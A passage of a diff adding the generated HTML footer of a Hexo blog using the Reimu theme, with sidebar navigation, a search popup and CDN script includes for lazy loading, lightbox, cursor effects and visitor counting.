href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.</span> <span class="toc-text"> 总结</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Dusk" class="lazyload">
+  <div class="sidebar-author-name">Dusk</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">14</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">5</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div class="reimu-search-input" id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png"/>
+        </div>
+      </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+  
+<script src="/js/generator_search.js" defer></script>
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.0.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+<script data-pjax>
+  var updateTime = _$('#post-update-time')?.innerHTML;
+
+  if (updateTime) {
+    const update = new Date(updateTime);
+    const now = new Date();
+    const diff = now - update;
+    const days = diff / 86400000;
+    const { daysAgo, message: template } = window.REIMU_CONFIG.outdate;
+    if (days >= daysAgo) {
+      const message = template.replace(/{time}/, updateTime);
+      const blockquote = _$('#outdate-blockquote');
+      if (blockquote) {
+        blockquote.querySelector('p').innerText = message;
+        blockquote.style.display = 'block';
+      }
+    }
+  }
+</script>
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
+
